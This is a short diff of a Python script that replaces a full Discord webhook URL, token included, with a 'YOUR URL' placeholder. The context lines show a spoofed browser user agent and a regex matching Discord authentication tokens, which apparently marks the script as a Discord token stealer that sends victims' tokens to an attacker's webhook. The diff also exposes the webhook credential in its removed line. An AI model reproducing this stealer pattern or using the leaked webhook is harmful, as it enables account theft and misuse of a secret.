@@ -1,6 +1,6 @@
 import requests,json,re,os,base64,typing,urllib.request
 
-WEBHOOK_URL="https://discord.com/api/webhooks/1363437812648509501/c00wVqoW4fRmsdPZgP9mVWtgNAlXp_swj6yLz-vGbQjG05xr1Y1qBUtsRjww9Hnr3pqq"
+WEBHOOK_URL="YOUR URL"
 REQUEST_HEADERS={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11"}
 TOKEN_REGEX_PATTERN=r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"
 
